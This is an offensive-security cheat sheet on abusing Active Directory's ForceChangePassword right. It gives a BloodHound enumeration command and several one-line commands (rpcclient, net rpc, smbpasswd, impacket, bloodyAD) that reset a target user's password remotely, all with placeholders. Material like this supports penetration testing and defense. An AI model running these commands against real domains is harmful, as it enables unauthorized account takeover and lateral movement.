# Unix Shell

## 01 - Detect

> [!IMPORTANT] Conditions
> Write the conditions...

```
$ bloodhound-python -u <username> -p <password> -ns <domain_controller_IP> -d <domain>.<tld> -c All
```

## 02 - Exploit

```
rpcclient $> chgpasswd <username> <old_password> <new_password>
```

```
$ net <ads | rpc> password "<target_username>" "<new_password>" -U <domain>/"<username>%<password>" -S <IP>
```

```
$ smbpasswd -U <target_username>%<password> -r <IP>
```

```
$ smbpasswd.py [<domain>]/<username>:<password>@<IP> -newpass <new_password>
```

```
$ bloodyAD --host "<domain_controller_IP>" -d "<domain>.<tld>" -u "<username>" -p "<password>" set password "<target_username>" "<new_password>"
```

---
## References

- [Hacking Articles: Abusing AD-DACL - ForceChangePassword](https://www.hackingarticles.in/abusing-ad-dacl-forcechangepassword/)

- [n00py: Resetting an Expired Password Remotely](https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/)